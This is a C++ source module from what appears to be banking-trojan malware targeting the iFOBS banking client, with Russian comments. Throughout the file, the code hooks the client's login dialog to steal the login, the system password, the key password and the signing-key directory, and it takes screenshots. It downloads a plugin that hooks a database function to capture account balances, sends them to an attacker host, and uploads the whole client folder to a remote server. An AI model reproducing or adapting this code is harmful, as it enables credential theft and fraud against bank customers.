#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "BotDebug.h"

namespace IFOBSCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG IFOBSCLIENT::DBGOutMessage<>

namespace IFobs
{

const int PROCESS_HASH = 0x9FF6B644; /* ifobsclient.exe */
const DWORD HashClassEditControl = 0x2ED8AE2E; /* TcxCustomInnerTextEdit */
const int CountEditControl = 4;

struct ForFindEditControl
{
	char* texts[CountEditControl];
	int n;
};

struct AccBalans
{
	char acc[64];
	char balans[64];
};

int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
//прототип из ifobs.plug
typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindEditControl* ffec = (ForFindEditControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( hash == HashClassEditControl )
	{
		ffec->texts[ffec->n] = GetWndText(hwnd);
		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffec->texts[ffec->n] );
		ffec->n++;
		if( ffec->n >= CountEditControl ) return FALSE;
	}
	return TRUE;
}

void AddStrLog( const char* name, const char* value )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "IFobs", buf );
}

//в окне регистрации 4-е текстовых поля ввода, путем перечисления всех дочерних окон находим эти контролы
//в массиве texts структуры ForFindEditControl они находятся в следующем порядке: 0 - путь к ключам, 
//1 - пароль для ключей, 2 - пароль для входа систему, 3 - логин
void GrabData( HWND wnd )
{
	DBG( "IFobs", "Грабим данные" );
	ForFindEditControl ffec;
	ClearStruct(ffec);
	pEnumChildWindows( wnd, EnumChildProc, &ffec );
	AddStrLog( "Login", ffec.texts[3] );
	AddStrLog( "Password system", ffec.texts[2] );
	AddStrLog( "Password key", ffec.texts[1] );
	AddStrLog( "Path keys", ffec.texts[0] );
	DWORD attr = (DWORD)pGetFileAttributesA(ffec.texts[0]);
	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
		KeyLogger::AddDirectory( ffec.texts[0], "Keys" );
	for( int i = 0; i < ffec.n; i++ ) STR::Free(ffec.texts[i]);
}

void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
{
	if( Msg->message == WM_LBUTTONUP )
	{
		char text[64];
		GetWindowTextA( Msg->hwnd, text, sizeof(text) );
		if( m_lstrcmp( text, "Принять" ) == 0 )
		{
			HWND parent = (HWND)pGetParent(Msg->hwnd);
			if( !KeyLogger::IsWindowDialog(parent) ) return;
			GrabData(parent);
		}
	}
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "rus.zika.in" );
#else
//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

static DWORD WINAPI SendBalans( LPVOID p )
{
	char urlAdmin[128];
	if( GetAdminUrl(urlAdmin) )
	{
		AccBalans* ab = (AccBalans*)p;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		TMemory request(512);
		string azUser = GetAzUser();
		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc );
//		THTTP H;
//		H.Get(request.AsStr());
		THTTPResponseRec Response;
		ClearStruct(Response);
		HTTP::Get( request.AsStr(), 0, &Response );
		HTTPResponse::Clear(&Response);
		DBG( "IFobs", "Отослали запрос: %s", request.AsStr() );
	}
	MemFree(p);
	return 0;
}

void WINAPI PutBalans( const char* acc, const char* balans )
{
	DBG( "IFobs", "acc: %s, balans: %s", acc, balans );
	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
	m_lstrcpy( ab->acc, acc );
	m_lstrcpy( ab->balans, balans );
	RunThread( SendBalans, ab );
}

DWORD WINAPI PluginIFobs(LPVOID)
{
	TPlugin ifobsPlug("ifobs.plug");
	if( ifobsPlug.Download(true) )
	{
		ifobsPlug.SetNotFree();
		DBG( "IFobs", "Загрузили ifobs.plug" );
		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
		if( InitFunc )
		{
			DBG( "IFobs", "есть InitFunc" );
			DWORD HProc1 = (DWORD)ifobsPlug.GetProcAddress("HProc1");
			if( HProc1 )
			{
				DBG( "IFobs", "есть HProc1" );
				//хукаем функцию @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString
				if( HookApi( "VistaDB_D7.bpl", 0x238E92A4, (PVOID)HProc1, (PVOID*)&pTVDBDirectGetCurrency ) )
				{
					DBG( "IFobs", "Установлен хук на @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString" );
					if( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
						DBG( "IFobs", "BalanceCallBack set ok.");
					if( InitFunc((DWORD)pTVDBDirectGetCurrency, "GetCurrency") )
						DBG( "IFobs", "хук установлен успешно, %08x %08x", pTVDBDirectGetCurrency, HProc1 );
				}
			}
		}
	}
	else
		DBG( "IFobs", "Не удалось загрузить ifobs.plug" );
	return 0;
}

//отсылка полного клиента на видео сервер
DWORD WINAPI SendIFobs(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "IFobs", "запуск отсылки программы на сервер из папки %s", folderIFobs );
	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
	DWORD folderSize = 0;
	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
	{
		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
		return 0;
	}
	DBG( "IFobs", "Размер папки %d байт", folderSize );
	char tempFolder[MAX_PATH];
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	pPathAppendA( tempFolder, "ifobs" );
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "IFobs", "Копирование во временную папку %s", tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
	{
		DBG( "IFobs", "Копирование на сервер" );
		VideoRecorder::SendFiles(tempFolder);
		DeleteFolders(tempFolder);
		DBG( "IFobs", "Копирование на сервер окончено" );
	}
	else
		DBG( "IFobs", "Копирование в временную папку не удалось" );
	return 0;
}

void Activeted(LPVOID Sender)
{
	DBG( "IFobs", "Activated" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
	RunThread( PluginIFobs, 0 );
	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
		MegaJump(SendIFobs);
}

bool Init( const char* appName )
{
	DBG( "IFobs", "Регистрация системы" );
	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
	if( S != NULL )
	{
		char* caption = "*iFOBS*Регистрация*";
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		S->OnActivate = Activeted;
		//S->OnDeactivate = Deactiveted;
		S->OnMessage = OnMessage;
		
		KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
	}
	return true;
}

}
